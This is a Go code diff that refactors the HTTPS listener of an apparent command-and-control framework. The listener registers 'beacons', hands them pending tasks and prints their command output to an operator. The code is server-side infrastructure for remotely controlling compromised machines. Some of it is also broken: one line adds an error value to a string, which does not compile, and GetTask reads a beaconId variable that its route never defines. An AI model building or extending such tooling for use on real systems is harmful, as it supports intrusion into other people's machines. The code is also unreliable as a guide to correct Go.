@@ -45,9 +45,9 @@ func (l *HttpsListener) Start() {
 	r := mux.NewRouter()
 	beaconApi := r.PathPrefix("/").Subrouter()
 
-	beaconApi.HandleFunc("/register", RegisterBeaconHandler).Methods("POST")
-	beaconApi.HandleFunc("/tasks", GetTasksHandler).Methods("GET")
-	beaconApi.HandleFunc("/results/{beaconId}", PostResultsHandler).Methods("POST")
+	beaconApi.HandleFunc("/register", RegisterBeacon).Methods("POST")
+	beaconApi.HandleFunc("/tasks", GetTask).Methods("GET")
+	beaconApi.HandleFunc("/results/{beaconId}", PostResults).Methods("POST")
 
 	tlsConfig := &tls.Config{
 		MinVersion: tls.VersionTLS12,
@@ -79,43 +79,25 @@ func (l *HttpsListener) Stop() error {
 }
 
 // Registers the beacon, hands a unique UUID to identify them, received some critical info about the beacons env
-func RegisterBeaconHandler(w http.ResponseWriter, r *http.Request) {
-	// Parse
-	var beacon core.Beacon
-	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
-		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
-		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
+	beacon, err := core.NewBeacon(w, r)
+	if err != nil {
+		fmt.Println(util.PrintBad + "Failed to register new beacon:" + err)
 		return
 	}
-	// Server side info
-	beacon.ID = uuid.New().String()
-	beacon.FirstSeen = time.Now()
-	beacon.LastSeen = time.Now()
-	beacon.ExternalIP = r.RemoteAddr
-
-	// push to array
-	core.Beacons = append(core.Beacons, beacon)
-
-	// Send back full json of Beacon type, most importantly uuid
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(beacon)
 }
 
-// Parses & updates "Tasks", Prints out received command result from beacon
-func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
-	// Parse
+func PostResults(w http.ResponseWriter, r *http.Request) {
 	var TaskRes core.Task
 	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
 		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
 		http.Error(w, "Invalid JSON", http.StatusBadRequest)
 		return
 	}
-	// Update task
-	for i := 0; i < len(core.Tasks); i++ {
-		if core.Tasks[i].TaskID == TaskRes.TaskID {
-			core.Tasks[i] = TaskRes
-		}
-	}
+	core.UpdateTask(TaskRes)
+
 	// Display to operator
 	fmt.Printf("%s [%s] Beacon called back home, received %d bytes\n", util.PrintStatus, TaskRes.BeaconID, len(TaskRes.Output))
 	if TaskRes.Status == "failed" {
@@ -125,17 +107,10 @@ func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// Sends Next Waiting Task to Agent from oldest -> latest FIFO
-func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
+func GetTask(w http.ResponseWriter, r *http.Request) {
 	beaconId := mux.Vars(r)["beaconId"]
-	var beaconTask core.Task
-
-	for i := 0; i < len(core.Tasks); i++ {
-		if core.Tasks[i].BeaconID == beaconId && core.Tasks[i].Status == "pending" {
-			beaconTask = core.Tasks[i]
-		}
-	}
+	next := core.NextTask(beaconId)
 
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(beaconTask)
+	json.NewEncoder(w).Encode(next)
 }
